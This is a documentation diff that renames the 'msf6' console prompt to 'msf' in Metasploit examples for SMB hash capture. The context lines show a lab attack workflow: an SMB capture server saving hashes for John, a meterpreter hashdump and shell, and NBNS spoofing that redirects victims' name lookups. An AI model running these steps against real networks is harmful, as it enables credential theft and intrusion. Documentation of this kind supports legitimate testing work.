@@ -51,10 +51,10 @@ Kali 2021.1 with `smbclient 4.13.5` installed.
 Server:
 
 ```
-msf6 exploit(multi/handler) > use auxiliary/server/capture/smb
-msf6 auxiliary(server/capture/smb) > set JOHNPWFILE /tmp/john
+msf exploit(multi/handler) > use auxiliary/server/capture/smb
+msf auxiliary(server/capture/smb) > set JOHNPWFILE /tmp/john
 JOHNPWFILE => /tmp/john
-msf6 auxiliary(server/capture/smb) > run
+msf auxiliary(server/capture/smb) > run
 [*] Auxiliary module running as background job 1.
 
 [+] Server is running. Listening on 0.0.0.0:445
@@ -103,15 +103,15 @@ meterpreter > hashdump
 [-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
 meterpreter > background
 [*] Backgrounding session 1...
-msf6 exploit(multi/handler) > use auxiliary/server/capture/smb
-msf6 auxiliary(server/capture/smb) > set JOPHNPWFILE /tmp/john
+msf exploit(multi/handler) > use auxiliary/server/capture/smb
+msf auxiliary(server/capture/smb) > set JOPHNPWFILE /tmp/john
 JOHNPWFILE => /tmp/john
-msf6 auxiliary(server/capture/smb) > run
+msf auxiliary(server/capture/smb) > run
 [*] Auxiliary module running as background job 1.
 
 [+] Server is running. Listening on 0.0.0.0:445
 
-msf6 auxiliary(server/capture/smb) > sessions -i 1
+msf auxiliary(server/capture/smb) > sessions -i 1
 [*] Starting interaction with 1...
 
 meterpreter > shell
@@ -181,10 +181,10 @@ service apache2 start
 Server:
 
 ```
-msf6 > use auxiliary/server/capture/smb
-msf6 auxiliary(server/capture/smb) > set JOHNPWFILE /tmp/john
+msf > use auxiliary/server/capture/smb
+msf auxiliary(server/capture/smb) > set JOHNPWFILE /tmp/john
 JOHNPWFILE => /tmp/john
-msf6 auxiliary(server/capture/smb) > run
+msf auxiliary(server/capture/smb) > run
 [*] Auxiliary module running as background job 1.
 
 [+] Server is running. Listening on 0.0.0.0:445
@@ -227,21 +227,21 @@ This is based on [hackingarticles.in](https://www.hackingarticles.in/4-ways-capt
 Server side:
 
 ```
-msf6 > use auxiliary/server/capture/smb
-msf6 auxiliary(server/capture/smb) > set JOHNPWFILE /tmp/johnnbns
+msf > use auxiliary/server/capture/smb
+msf auxiliary(server/capture/smb) > set JOHNPWFILE /tmp/johnnbns
 JOHNPWFILE => /tmp/johnnbns
-msf6 auxiliary(server/capture/smb) > run
+msf auxiliary(server/capture/smb) > run
 [*] Auxiliary module running as background job 0.
 
 [+] Server is running. Listening on 0.0.0.0:445
-msf6 auxiliary(server/capture/smb) > use auxiliary/spoof/nbns/nbns_response
-msf6 auxiliary(spoof/nbns/nbns_response) > set spoofip 192.168.89.1
+msf auxiliary(server/capture/smb) > use auxiliary/spoof/nbns/nbns_response
+msf auxiliary(spoof/nbns/nbns_response) > set spoofip 192.168.89.1
 spoofip => 192.168.89.1
-msf6 auxiliary(spoof/nbns/nbns_response) > set interface eth0
+msf auxiliary(spoof/nbns/nbns_response) > set interface eth0
 interface => eth0
-msf6 auxiliary(spoof/nbns/nbns_response) > exploit
+msf auxiliary(spoof/nbns/nbns_response) > exploit
 [*] Auxiliary module running as background job 1.
-msf6 auxiliary(spoof/nbns/nbns_response) > 
+msf auxiliary(spoof/nbns/nbns_response) > 
 [*] NBNS Spoofer started. Listening for NBNS requests with REGEX ".*" ...
 [+] 192.168.89.135    nbns - FAKE matches regex, responding with 192.168.89.1
 [+] 192.168.89.135    nbns - FAKE matches regex, responding with 192.168.89.1
